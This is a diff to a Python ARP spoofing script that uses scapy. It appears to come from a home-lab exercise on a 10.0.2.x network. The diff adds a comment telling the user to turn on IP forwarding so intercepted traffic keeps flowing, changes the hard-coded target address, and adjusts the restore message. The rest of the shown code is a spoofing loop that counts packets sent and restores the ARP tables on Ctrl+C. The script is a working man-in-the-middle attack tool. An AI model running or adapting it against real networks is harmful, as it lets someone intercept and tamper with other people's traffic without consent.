@@ -1,5 +1,7 @@
 #!usr/bin/env python
 
+# to enable flow of packets type in terminal: sysctl -w net.ipv4.ip_forward=1
+
 import sys
 import scapy.all as scapy
 import time
@@ -37,10 +39,10 @@ def start(target_ip, gateway_ip):
             print("\r[-] Packets sent: " + str(packets_count), end="")
             time.sleep(2)
     except KeyboardInterrupt:
-        print("[+] Detected Ctrl + C...Restoring")
+        print("\n[+] Detected Ctrl + C...Restoring")
         restore(gateway_ip, target_ip)
         restore(target_ip, gateway_ip)
 
-target_ip = "10.0.2.7"
+target_ip = "10.0.2.4"
 gateway_ip = "10.0.2.1"
 start(target_ip, gateway_ip)
